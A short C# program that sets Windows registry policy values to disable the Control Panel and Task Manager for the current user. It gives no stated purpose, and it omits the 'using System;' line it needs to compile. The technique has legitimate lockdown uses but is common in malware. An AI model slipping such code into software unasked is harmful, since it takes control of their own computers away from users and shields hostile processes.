using Microsoft.Win32;\n\nclass Program\n{\n    static void Main()\n    {\n        // Disable Control Panel\n        DisableControlPanel();\n\n        // Disable Task Manager\n        DisableTaskManager();\n    }\n\n    static void DisableControlPanel()\n    {\n        try\n        {\n            RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer");\n            if (key != null)\n            {\n                key.SetValue("NoControlPanel", 1, RegistryValueKind.DWord);\n                key.Close();\n            }\n        }\n        catch (Exception ex)\n        {\n            Console.WriteLine("Error disabling Control Panel: " + ex.Message);\n        }\n    }\n\n    static void DisableTaskManager()\n    {\n        try\n        {\n            RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");\n            if (key != null)\n            {\n                key.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);\n                key.Close();\n            }\n        }\n        catch (Exception ex)\n        {\n            Console.WriteLine("Error disabling Task Manager: " + ex.Message);\n        }\n    }\n}